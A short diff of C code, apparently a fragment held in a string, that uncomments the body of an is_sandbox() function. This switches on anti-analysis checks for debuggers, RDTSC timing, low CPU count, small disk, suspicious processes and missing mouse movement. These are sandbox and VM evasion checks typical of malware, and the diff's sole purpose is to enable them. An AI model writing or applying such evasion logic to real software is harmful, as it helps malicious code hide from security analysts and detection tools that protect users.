@@ -118,7 +118,6 @@ static BOOL no_mouse_movement(void) {
 
 // ── Master check: returns TRUE if environment looks like a sandbox/VM ─────────
 static BOOL is_sandbox(void) {
-    /* 
     if (is_debugged())                return TRUE;
     if (rdtsc_timing_check())         return TRUE;
     if (low_cpu_count())              return TRUE;
@@ -126,7 +125,6 @@ static BOOL is_sandbox(void) {
     if (small_disk())                 return TRUE;
     if (suspicious_process_running()) return TRUE;
     if (no_mouse_movement())          return TRUE;
-    */
     return FALSE;
 }
 """
